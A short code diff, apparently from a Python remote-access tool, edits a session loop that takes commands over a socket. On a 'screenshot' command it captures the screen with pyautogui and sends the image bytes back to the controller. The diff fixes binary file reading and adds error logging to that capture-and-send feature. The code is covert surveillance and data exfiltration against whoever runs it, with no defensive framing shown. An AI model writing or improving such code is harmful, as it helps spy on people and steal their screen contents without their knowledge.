@@ -27,11 +27,12 @@ def start_session(s):
             if "screenshot" in cmd:
                 try:
                     pyautogui.screenshot("HP.png")
-                    file = open("HP.png",'r')
+                    file = open("HP.png",'rb')
                     data = file.read()
                     file.close()
                     s.send(data)
-                except:
+                except Exception as e:
+                    print("[*] Error : %s"%(str(e)))
                     s.send("FAILED".encode())
 
             if "CHECK" in cmd:
